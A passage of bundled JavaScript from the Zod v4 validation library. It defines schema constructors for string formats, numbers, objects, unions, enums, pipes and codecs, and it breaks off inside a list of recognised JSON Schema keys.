function guid2(params) {
  return _guid(ZodGUID, params);
}
var ZodUUID = /* @__PURE__ */ $constructor("ZodUUID", (inst, def) => {
  $ZodUUID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function uuid2(params) {
  return _uuid(ZodUUID, params);
}
function uuidv4(params) {
  return _uuidv4(ZodUUID, params);
}
function uuidv6(params) {
  return _uuidv6(ZodUUID, params);
}
function uuidv7(params) {
  return _uuidv7(ZodUUID, params);
}
var ZodURL = /* @__PURE__ */ $constructor("ZodURL", (inst, def) => {
  $ZodURL.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function url(params) {
  return _url(ZodURL, params);
}
function httpUrl(params) {
  return _url(ZodURL, {
    protocol: /^https?$/,
    hostname: exports_regexes.domain,
    ...exports_util.normalizeParams(params)
  });
}
var ZodEmoji = /* @__PURE__ */ $constructor("ZodEmoji", (inst, def) => {
  $ZodEmoji.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function emoji2(params) {
  return _emoji2(ZodEmoji, params);
}
var ZodNanoID = /* @__PURE__ */ $constructor("ZodNanoID", (inst, def) => {
  $ZodNanoID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function nanoid2(params) {
  return _nanoid(ZodNanoID, params);
}
var ZodCUID = /* @__PURE__ */ $constructor("ZodCUID", (inst, def) => {
  $ZodCUID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function cuid3(params) {
  return _cuid(ZodCUID, params);
}
var ZodCUID2 = /* @__PURE__ */ $constructor("ZodCUID2", (inst, def) => {
  $ZodCUID2.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function cuid22(params) {
  return _cuid2(ZodCUID2, params);
}
var ZodULID = /* @__PURE__ */ $constructor("ZodULID", (inst, def) => {
  $ZodULID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function ulid2(params) {
  return _ulid(ZodULID, params);
}
var ZodXID = /* @__PURE__ */ $constructor("ZodXID", (inst, def) => {
  $ZodXID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function xid2(params) {
  return _xid(ZodXID, params);
}
var ZodKSUID = /* @__PURE__ */ $constructor("ZodKSUID", (inst, def) => {
  $ZodKSUID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function ksuid2(params) {
  return _ksuid(ZodKSUID, params);
}
var ZodIPv4 = /* @__PURE__ */ $constructor("ZodIPv4", (inst, def) => {
  $ZodIPv4.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function ipv42(params) {
  return _ipv4(ZodIPv4, params);
}
var ZodMAC = /* @__PURE__ */ $constructor("ZodMAC", (inst, def) => {
  $ZodMAC.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function mac2(params) {
  return _mac(ZodMAC, params);
}
var ZodIPv6 = /* @__PURE__ */ $constructor("ZodIPv6", (inst, def) => {
  $ZodIPv6.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function ipv62(params) {
  return _ipv6(ZodIPv6, params);
}
var ZodCIDRv4 = /* @__PURE__ */ $constructor("ZodCIDRv4", (inst, def) => {
  $ZodCIDRv4.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function cidrv42(params) {
  return _cidrv4(ZodCIDRv4, params);
}
var ZodCIDRv6 = /* @__PURE__ */ $constructor("ZodCIDRv6", (inst, def) => {
  $ZodCIDRv6.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function cidrv62(params) {
  return _cidrv6(ZodCIDRv6, params);
}
var ZodBase64 = /* @__PURE__ */ $constructor("ZodBase64", (inst, def) => {
  $ZodBase64.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function base642(params) {
  return _base64(ZodBase64, params);
}
var ZodBase64URL = /* @__PURE__ */ $constructor("ZodBase64URL", (inst, def) => {
  $ZodBase64URL.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function base64url2(params) {
  return _base64url(ZodBase64URL, params);
}
var ZodE164 = /* @__PURE__ */ $constructor("ZodE164", (inst, def) => {
  $ZodE164.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function e1642(params) {
  return _e164(ZodE164, params);
}
var ZodJWT = /* @__PURE__ */ $constructor("ZodJWT", (inst, def) => {
  $ZodJWT.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function jwt(params) {
  return _jwt(ZodJWT, params);
}
var ZodCustomStringFormat = /* @__PURE__ */ $constructor("ZodCustomStringFormat", (inst, def) => {
  $ZodCustomStringFormat.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function stringFormat(format, fnOrRegex, _params = {}) {
  return _stringFormat(ZodCustomStringFormat, format, fnOrRegex, _params);
}
function hostname2(_params) {
  return _stringFormat(ZodCustomStringFormat, "hostname", exports_regexes.hostname, _params);
}
function hex2(_params) {
  return _stringFormat(ZodCustomStringFormat, "hex", exports_regexes.hex, _params);
}
function hash(alg, params) {
  const enc = params?.enc ?? "hex";
  const format = `${alg}_${enc}`;
  const regex = exports_regexes[format];
  if (!regex)
    throw new Error(`Unrecognized hash format: ${format}`);
  return _stringFormat(ZodCustomStringFormat, format, regex, params);
}
var ZodNumber = /* @__PURE__ */ $constructor("ZodNumber", (inst, def) => {
  $ZodNumber.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => numberProcessor(inst, ctx, json, params);
  inst.gt = (value, params) => inst.check(_gt(value, params));
  inst.gte = (value, params) => inst.check(_gte(value, params));
  inst.min = (value, params) => inst.check(_gte(value, params));
  inst.lt = (value, params) => inst.check(_lt(value, params));
  inst.lte = (value, params) => inst.check(_lte(value, params));
  inst.max = (value, params) => inst.check(_lte(value, params));
  inst.int = (params) => inst.check(int(params));
  inst.safe = (params) => inst.check(int(params));
  inst.positive = (params) => inst.check(_gt(0, params));
  inst.nonnegative = (params) => inst.check(_gte(0, params));
  inst.negative = (params) => inst.check(_lt(0, params));
  inst.nonpositive = (params) => inst.check(_lte(0, params));
  inst.multipleOf = (value, params) => inst.check(_multipleOf(value, params));
  inst.step = (value, params) => inst.check(_multipleOf(value, params));
  inst.finite = () => inst;
  const bag = inst._zod.bag;
  inst.minValue = Math.max(bag.minimum ?? Number.NEGATIVE_INFINITY, bag.exclusiveMinimum ?? Number.NEGATIVE_INFINITY) ?? null;
  inst.maxValue = Math.min(bag.maximum ?? Number.POSITIVE_INFINITY, bag.exclusiveMaximum ?? Number.POSITIVE_INFINITY) ?? null;
  inst.isInt = (bag.format ?? "").includes("int") || Number.isSafeInteger(bag.multipleOf ?? 0.5);
  inst.isFinite = true;
  inst.format = bag.format ?? null;
});
function number2(params) {
  return _number(ZodNumber, params);
}
var ZodNumberFormat = /* @__PURE__ */ $constructor("ZodNumberFormat", (inst, def) => {
  $ZodNumberFormat.init(inst, def);
  ZodNumber.init(inst, def);
});
function int(params) {
  return _int(ZodNumberFormat, params);
}
function float32(params) {
  return _float32(ZodNumberFormat, params);
}
function float64(params) {
  return _float64(ZodNumberFormat, params);
}
function int32(params) {
  return _int32(ZodNumberFormat, params);
}
function uint32(params) {
  return _uint32(ZodNumberFormat, params);
}
var ZodBoolean = /* @__PURE__ */ $constructor("ZodBoolean", (inst, def) => {
  $ZodBoolean.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => booleanProcessor(inst, ctx, json, params);
});
function boolean2(params) {
  return _boolean(ZodBoolean, params);
}
var ZodBigInt = /* @__PURE__ */ $constructor("ZodBigInt", (inst, def) => {
  $ZodBigInt.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => bigintProcessor(inst, ctx, json, params);
  inst.gte = (value, params) => inst.check(_gte(value, params));
  inst.min = (value, params) => inst.check(_gte(value, params));
  inst.gt = (value, params) => inst.check(_gt(value, params));
  inst.gte = (value, params) => inst.check(_gte(value, params));
  inst.min = (value, params) => inst.check(_gte(value, params));
  inst.lt = (value, params) => inst.check(_lt(value, params));
  inst.lte = (value, params) => inst.check(_lte(value, params));
  inst.max = (value, params) => inst.check(_lte(value, params));
  inst.positive = (params) => inst.check(_gt(BigInt(0), params));
  inst.negative = (params) => inst.check(_lt(BigInt(0), params));
  inst.nonpositive = (params) => inst.check(_lte(BigInt(0), params));
  inst.nonnegative = (params) => inst.check(_gte(BigInt(0), params));
  inst.multipleOf = (value, params) => inst.check(_multipleOf(value, params));
  const bag = inst._zod.bag;
  inst.minValue = bag.minimum ?? null;
  inst.maxValue = bag.maximum ?? null;
  inst.format = bag.format ?? null;
});
function bigint2(params) {
  return _bigint(ZodBigInt, params);
}
var ZodBigIntFormat = /* @__PURE__ */ $constructor("ZodBigIntFormat", (inst, def) => {
  $ZodBigIntFormat.init(inst, def);
  ZodBigInt.init(inst, def);
});
function int64(params) {
  return _int64(ZodBigIntFormat, params);
}
function uint64(params) {
  return _uint64(ZodBigIntFormat, params);
}
var ZodSymbol = /* @__PURE__ */ $constructor("ZodSymbol", (inst, def) => {
  $ZodSymbol.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => symbolProcessor(inst, ctx, json, params);
});
function symbol(params) {
  return _symbol(ZodSymbol, params);
}
var ZodUndefined = /* @__PURE__ */ $constructor("ZodUndefined", (inst, def) => {
  $ZodUndefined.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => undefinedProcessor(inst, ctx, json, params);
});
function _undefined3(params) {
  return _undefined2(ZodUndefined, params);
}
var ZodNull = /* @__PURE__ */ $constructor("ZodNull", (inst, def) => {
  $ZodNull.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => nullProcessor(inst, ctx, json, params);
});
function _null3(params) {
  return _null2(ZodNull, params);
}
var ZodAny = /* @__PURE__ */ $constructor("ZodAny", (inst, def) => {
  $ZodAny.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => anyProcessor(inst, ctx, json, params);
});
function any() {
  return _any(ZodAny);
}
var ZodUnknown = /* @__PURE__ */ $constructor("ZodUnknown", (inst, def) => {
  $ZodUnknown.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => unknownProcessor(inst, ctx, json, params);
});
function unknown() {
  return _unknown(ZodUnknown);
}
var ZodNever = /* @__PURE__ */ $constructor("ZodNever", (inst, def) => {
  $ZodNever.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => neverProcessor(inst, ctx, json, params);
});
function never(params) {
  return _never(ZodNever, params);
}
var ZodVoid = /* @__PURE__ */ $constructor("ZodVoid", (inst, def) => {
  $ZodVoid.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => voidProcessor(inst, ctx, json, params);
});
function _void2(params) {
  return _void(ZodVoid, params);
}
var ZodDate = /* @__PURE__ */ $constructor("ZodDate", (inst, def) => {
  $ZodDate.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => dateProcessor(inst, ctx, json, params);
  inst.min = (value, params) => inst.check(_gte(value, params));
  inst.max = (value, params) => inst.check(_lte(value, params));
  const c = inst._zod.bag;
  inst.minDate = c.minimum ? new Date(c.minimum) : null;
  inst.maxDate = c.maximum ? new Date(c.maximum) : null;
});
function date3(params) {
  return _date(ZodDate, params);
}
var ZodArray = /* @__PURE__ */ $constructor("ZodArray", (inst, def) => {
  $ZodArray.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => arrayProcessor(inst, ctx, json, params);
  inst.element = def.element;
  inst.min = (minLength, params) => inst.check(_minLength(minLength, params));
  inst.nonempty = (params) => inst.check(_minLength(1, params));
  inst.max = (maxLength, params) => inst.check(_maxLength(maxLength, params));
  inst.length = (len, params) => inst.check(_length(len, params));
  inst.unwrap = () => inst.element;
});
function array(element, params) {
  return _array(ZodArray, element, params);
}
function keyof(schema) {
  const shape = schema._zod.def.shape;
  return _enum2(Object.keys(shape));
}
var ZodObject = /* @__PURE__ */ $constructor("ZodObject", (inst, def) => {
  $ZodObjectJIT.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => objectProcessor(inst, ctx, json, params);
  exports_util.defineLazy(inst, "shape", () => {
    return def.shape;
  });
  inst.keyof = () => _enum2(Object.keys(inst._zod.def.shape));
  inst.catchall = (catchall) => inst.clone({ ...inst._zod.def, catchall });
  inst.passthrough = () => inst.clone({ ...inst._zod.def, catchall: unknown() });
  inst.loose = () => inst.clone({ ...inst._zod.def, catchall: unknown() });
  inst.strict = () => inst.clone({ ...inst._zod.def, catchall: never() });
  inst.strip = () => inst.clone({ ...inst._zod.def, catchall: undefined });
  inst.extend = (incoming) => {
    return exports_util.extend(inst, incoming);
  };
  inst.safeExtend = (incoming) => {
    return exports_util.safeExtend(inst, incoming);
  };
  inst.merge = (other) => exports_util.merge(inst, other);
  inst.pick = (mask) => exports_util.pick(inst, mask);
  inst.omit = (mask) => exports_util.omit(inst, mask);
  inst.partial = (...args) => exports_util.partial(ZodOptional, inst, args[0]);
  inst.required = (...args) => exports_util.required(ZodNonOptional, inst, args[0]);
});
function object(shape, params) {
  const def = {
    type: "object",
    shape: shape ?? {},
    ...exports_util.normalizeParams(params)
  };
  return new ZodObject(def);
}
function strictObject(shape, params) {
  return new ZodObject({
    type: "object",
    shape,
    catchall: never(),
    ...exports_util.normalizeParams(params)
  });
}
function looseObject(shape, params) {
  return new ZodObject({
    type: "object",
    shape,
    catchall: unknown(),
    ...exports_util.normalizeParams(params)
  });
}
var ZodUnion = /* @__PURE__ */ $constructor("ZodUnion", (inst, def) => {
  $ZodUnion.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => unionProcessor(inst, ctx, json, params);
  inst.options = def.options;
});
function union(options, params) {
  return new ZodUnion({
    type: "union",
    options,
    ...exports_util.normalizeParams(params)
  });
}
var ZodXor = /* @__PURE__ */ $constructor("ZodXor", (inst, def) => {
  ZodUnion.init(inst, def);
  $ZodXor.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => unionProcessor(inst, ctx, json, params);
  inst.options = def.options;
});
function xor(options, params) {
  return new ZodXor({
    type: "union",
    options,
    inclusive: false,
    ...exports_util.normalizeParams(params)
  });
}
var ZodDiscriminatedUnion = /* @__PURE__ */ $constructor("ZodDiscriminatedUnion", (inst, def) => {
  ZodUnion.init(inst, def);
  $ZodDiscriminatedUnion.init(inst, def);
});
function discriminatedUnion(discriminator, options, params) {
  return new ZodDiscriminatedUnion({
    type: "union",
    options,
    discriminator,
    ...exports_util.normalizeParams(params)
  });
}
var ZodIntersection = /* @__PURE__ */ $constructor("ZodIntersection", (inst, def) => {
  $ZodIntersection.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => intersectionProcessor(inst, ctx, json, params);
});
function intersection(left, right) {
  return new ZodIntersection({
    type: "intersection",
    left,
    right
  });
}
var ZodTuple = /* @__PURE__ */ $constructor("ZodTuple", (inst, def) => {
  $ZodTuple.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => tupleProcessor(inst, ctx, json, params);
  inst.rest = (rest) => inst.clone({
    ...inst._zod.def,
    rest
  });
});
function tuple(items, _paramsOrRest, _params) {
  const hasRest = _paramsOrRest instanceof $ZodType;
  const params = hasRest ? _params : _paramsOrRest;
  const rest = hasRest ? _paramsOrRest : null;
  return new ZodTuple({
    type: "tuple",
    items,
    rest,
    ...exports_util.normalizeParams(params)
  });
}
var ZodRecord = /* @__PURE__ */ $constructor("ZodRecord", (inst, def) => {
  $ZodRecord.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => recordProcessor(inst, ctx, json, params);
  inst.keyType = def.keyType;
  inst.valueType = def.valueType;
});
function record(keyType, valueType, params) {
  return new ZodRecord({
    type: "record",
    keyType,
    valueType,
    ...exports_util.normalizeParams(params)
  });
}
function partialRecord(keyType, valueType, params) {
  const k = clone(keyType);
  k._zod.values = undefined;
  return new ZodRecord({
    type: "record",
    keyType: k,
    valueType,
    ...exports_util.normalizeParams(params)
  });
}
function looseRecord(keyType, valueType, params) {
  return new ZodRecord({
    type: "record",
    keyType,
    valueType,
    mode: "loose",
    ...exports_util.normalizeParams(params)
  });
}
var ZodMap = /* @__PURE__ */ $constructor("ZodMap", (inst, def) => {
  $ZodMap.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => mapProcessor(inst, ctx, json, params);
  inst.keyType = def.keyType;
  inst.valueType = def.valueType;
  inst.min = (...args) => inst.check(_minSize(...args));
  inst.nonempty = (params) => inst.check(_minSize(1, params));
  inst.max = (...args) => inst.check(_maxSize(...args));
  inst.size = (...args) => inst.check(_size(...args));
});
function map(keyType, valueType, params) {
  return new ZodMap({
    type: "map",
    keyType,
    valueType,
    ...exports_util.normalizeParams(params)
  });
}
var ZodSet = /* @__PURE__ */ $constructor("ZodSet", (inst, def) => {
  $ZodSet.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => setProcessor(inst, ctx, json, params);
  inst.min = (...args) => inst.check(_minSize(...args));
  inst.nonempty = (params) => inst.check(_minSize(1, params));
  inst.max = (...args) => inst.check(_maxSize(...args));
  inst.size = (...args) => inst.check(_size(...args));
});
function set(valueType, params) {
  return new ZodSet({
    type: "set",
    valueType,
    ...exports_util.normalizeParams(params)
  });
}
var ZodEnum = /* @__PURE__ */ $constructor("ZodEnum", (inst, def) => {
  $ZodEnum.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => enumProcessor(inst, ctx, json, params);
  inst.enum = def.entries;
  inst.options = Object.values(def.entries);
  const keys = new Set(Object.keys(def.entries));
  inst.extract = (values, params) => {
    const newEntries = {};
    for (const value of values) {
      if (keys.has(value)) {
        newEntries[value] = def.entries[value];
      } else
        throw new Error(`Key ${value} not found in enum`);
    }
    return new ZodEnum({
      ...def,
      checks: [],
      ...exports_util.normalizeParams(params),
      entries: newEntries
    });
  };
  inst.exclude = (values, params) => {
    const newEntries = { ...def.entries };
    for (const value of values) {
      if (keys.has(value)) {
        delete newEntries[value];
      } else
        throw new Error(`Key ${value} not found in enum`);
    }
    return new ZodEnum({
      ...def,
      checks: [],
      ...exports_util.normalizeParams(params),
      entries: newEntries
    });
  };
});
function _enum2(values, params) {
  const entries = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
  return new ZodEnum({
    type: "enum",
    entries,
    ...exports_util.normalizeParams(params)
  });
}
function nativeEnum(entries, params) {
  return new ZodEnum({
    type: "enum",
    entries,
    ...exports_util.normalizeParams(params)
  });
}
var ZodLiteral = /* @__PURE__ */ $constructor("ZodLiteral", (inst, def) => {
  $ZodLiteral.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => literalProcessor(inst, ctx, json, params);
  inst.values = new Set(def.values);
  Object.defineProperty(inst, "value", {
    get() {
      if (def.values.length > 1) {
        throw new Error("This schema contains multiple valid literal values. Use `.values` instead.");
      }
      return def.values[0];
    }
  });
});
function literal(value, params) {
  return new ZodLiteral({
    type: "literal",
    values: Array.isArray(value) ? value : [value],
    ...exports_util.normalizeParams(params)
  });
}
var ZodFile = /* @__PURE__ */ $constructor("ZodFile", (inst, def) => {
  $ZodFile.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => fileProcessor(inst, ctx, json, params);
  inst.min = (size, params) => inst.check(_minSize(size, params));
  inst.max = (size, params) => inst.check(_maxSize(size, params));
  inst.mime = (types, params) => inst.check(_mime(Array.isArray(types) ? types : [types], params));
});
function file(params) {
  return _file(ZodFile, params);
}
var ZodTransform = /* @__PURE__ */ $constructor("ZodTransform", (inst, def) => {
  $ZodTransform.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => transformProcessor(inst, ctx, json, params);
  inst._zod.parse = (payload, _ctx) => {
    if (_ctx.direction === "backward") {
      throw new $ZodEncodeError(inst.constructor.name);
    }
    payload.addIssue = (issue2) => {
      if (typeof issue2 === "string") {
        payload.issues.push(exports_util.issue(issue2, payload.value, def));
      } else {
        const _issue = issue2;
        if (_issue.fatal)
          _issue.continue = false;
        _issue.code ?? (_issue.code = "custom");
        _issue.input ?? (_issue.input = payload.value);
        _issue.inst ?? (_issue.inst = inst);
        payload.issues.push(exports_util.issue(_issue));
      }
    };
    const output = def.transform(payload.value, payload);
    if (output instanceof Promise) {
      return output.then((output2) => {
        payload.value = output2;
        return payload;
      });
    }
    payload.value = output;
    return payload;
  };
});
function transform(fn) {
  return new ZodTransform({
    type: "transform",
    transform: fn
  });
}
var ZodOptional = /* @__PURE__ */ $constructor("ZodOptional", (inst, def) => {
  $ZodOptional.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => optionalProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function optional(innerType) {
  return new ZodOptional({
    type: "optional",
    innerType
  });
}
var ZodExactOptional = /* @__PURE__ */ $constructor("ZodExactOptional", (inst, def) => {
  $ZodExactOptional.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => optionalProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function exactOptional(innerType) {
  return new ZodExactOptional({
    type: "optional",
    innerType
  });
}
var ZodNullable = /* @__PURE__ */ $constructor("ZodNullable", (inst, def) => {
  $ZodNullable.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => nullableProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function nullable(innerType) {
  return new ZodNullable({
    type: "nullable",
    innerType
  });
}
function nullish2(innerType) {
  return optional(nullable(innerType));
}
var ZodDefault = /* @__PURE__ */ $constructor("ZodDefault", (inst, def) => {
  $ZodDefault.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => defaultProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
  inst.removeDefault = inst.unwrap;
});
function _default2(innerType, defaultValue) {
  return new ZodDefault({
    type: "default",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : exports_util.shallowClone(defaultValue);
    }
  });
}
var ZodPrefault = /* @__PURE__ */ $constructor("ZodPrefault", (inst, def) => {
  $ZodPrefault.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => prefaultProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function prefault(innerType, defaultValue) {
  return new ZodPrefault({
    type: "prefault",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : exports_util.shallowClone(defaultValue);
    }
  });
}
var ZodNonOptional = /* @__PURE__ */ $constructor("ZodNonOptional", (inst, def) => {
  $ZodNonOptional.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => nonoptionalProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function nonoptional(innerType, params) {
  return new ZodNonOptional({
    type: "nonoptional",
    innerType,
    ...exports_util.normalizeParams(params)
  });
}
var ZodSuccess = /* @__PURE__ */ $constructor("ZodSuccess", (inst, def) => {
  $ZodSuccess.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => successProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function success(innerType) {
  return new ZodSuccess({
    type: "success",
    innerType
  });
}
var ZodCatch = /* @__PURE__ */ $constructor("ZodCatch", (inst, def) => {
  $ZodCatch.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => catchProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
  inst.removeCatch = inst.unwrap;
});
function _catch2(innerType, catchValue) {
  return new ZodCatch({
    type: "catch",
    innerType,
    catchValue: typeof catchValue === "function" ? catchValue : () => catchValue
  });
}
var ZodNaN = /* @__PURE__ */ $constructor("ZodNaN", (inst, def) => {
  $ZodNaN.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => nanProcessor(inst, ctx, json, params);
});
function nan(params) {
  return _nan(ZodNaN, params);
}
var ZodPipe = /* @__PURE__ */ $constructor("ZodPipe", (inst, def) => {
  $ZodPipe.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => pipeProcessor(inst, ctx, json, params);
  inst.in = def.in;
  inst.out = def.out;
});
function pipe(in_, out) {
  return new ZodPipe({
    type: "pipe",
    in: in_,
    out
  });
}
var ZodCodec = /* @__PURE__ */ $constructor("ZodCodec", (inst, def) => {
  ZodPipe.init(inst, def);
  $ZodCodec.init(inst, def);
});
function codec(in_, out, params) {
  return new ZodCodec({
    type: "pipe",
    in: in_,
    out,
    transform: params.decode,
    reverseTransform: params.encode
  });
}
var ZodReadonly = /* @__PURE__ */ $constructor("ZodReadonly", (inst, def) => {
  $ZodReadonly.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => readonlyProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function readonly(innerType) {
  return new ZodReadonly({
    type: "readonly",
    innerType
  });
}
var ZodTemplateLiteral = /* @__PURE__ */ $constructor("ZodTemplateLiteral", (inst, def) => {
  $ZodTemplateLiteral.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => templateLiteralProcessor(inst, ctx, json, params);
});
function templateLiteral(parts, params) {
  return new ZodTemplateLiteral({
    type: "template_literal",
    parts,
    ...exports_util.normalizeParams(params)
  });
}
var ZodLazy = /* @__PURE__ */ $constructor("ZodLazy", (inst, def) => {
  $ZodLazy.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => lazyProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.getter();
});
function lazy(getter) {
  return new ZodLazy({
    type: "lazy",
    getter
  });
}
var ZodPromise = /* @__PURE__ */ $constructor("ZodPromise", (inst, def) => {
  $ZodPromise.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => promiseProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function promise(innerType) {
  return new ZodPromise({
    type: "promise",
    innerType
  });
}
var ZodFunction = /* @__PURE__ */ $constructor("ZodFunction", (inst, def) => {
  $ZodFunction.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => functionProcessor(inst, ctx, json, params);
});
function _function(params) {
  return new ZodFunction({
    type: "function",
    input: Array.isArray(params?.input) ? tuple(params?.input) : params?.input ?? array(unknown()),
    output: params?.output ?? unknown()
  });
}
var ZodCustom = /* @__PURE__ */ $constructor("ZodCustom", (inst, def) => {
  $ZodCustom.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => customProcessor(inst, ctx, json, params);
});
function check(fn) {
  const ch = new $ZodCheck({
    check: "custom"
  });
  ch._zod.check = fn;
  return ch;
}
function custom(fn, _params) {
  return _custom(ZodCustom, fn ?? (() => true), _params);
}
function refine(fn, _params = {}) {
  return _refine(ZodCustom, fn, _params);
}
function superRefine(fn) {
  return _superRefine(fn);
}
var describe2 = describe;
var meta2 = meta;
function _instanceof(cls, params = {}) {
  const inst = new ZodCustom({
    type: "custom",
    check: "custom",
    fn: (data) => data instanceof cls,
    abort: true,
    ...exports_util.normalizeParams(params)
  });
  inst._zod.bag.Class = cls;
  inst._zod.check = (payload) => {
    if (!(payload.value instanceof cls)) {
      payload.issues.push({
        code: "invalid_type",
        expected: cls.name,
        input: payload.value,
        inst,
        path: [...inst._zod.def.path ?? []]
      });
    }
  };
  return inst;
}
var stringbool = (...args) => _stringbool({
  Codec: ZodCodec,
  Boolean: ZodBoolean,
  String: ZodString
}, ...args);
function json(params) {
  const jsonSchema = lazy(() => {
    return union([string2(params), number2(), boolean2(), _null3(), array(jsonSchema), record(string2(), jsonSchema)]);
  });
  return jsonSchema;
}
function preprocess(fn, schema) {
  return pipe(transform(fn), schema);
}
// node_modules/zod/v4/classic/compat.js
var ZodIssueCode = {
  invalid_type: "invalid_type",
  too_big: "too_big",
  too_small: "too_small",
  invalid_format: "invalid_format",
  not_multiple_of: "not_multiple_of",
  unrecognized_keys: "unrecognized_keys",
  invalid_union: "invalid_union",
  invalid_key: "invalid_key",
  invalid_element: "invalid_element",
  invalid_value: "invalid_value",
  custom: "custom"
};
function setErrorMap(map2) {
  config({
    customError: map2
  });
}
function getErrorMap() {
  return config().customError;
}
var ZodFirstPartyTypeKind;
(function(ZodFirstPartyTypeKind2) {})(ZodFirstPartyTypeKind || (ZodFirstPartyTypeKind = {}));
// node_modules/zod/v4/classic/from-json-schema.js
var z = {
  ...exports_schemas2,
  ...exports_checks2,
  iso: exports_iso
};
var RECOGNIZED_KEYS = new Set([
  "$schema",
  "$ref",
  "$defs",
  "definitions",
  "$id",
  "id",
  "$comment",
  "$anchor",
  "$vocabulary",
  "$dynamicRef",
  "$dynamicAnchor",
  "type",
  "enum",
  "const",
  "anyOf",
  "oneOf",
  "allOf",
  "not",
  "properties",
  "required",
  "additionalProperties",
  "patternProperties",
  "propertyNames",
  "minProperties",
  "maxProperties",
  "items",
  "prefixItems",
  "additionalItems",
  "minItems",
  "maxItems",
  "uniqueItems",
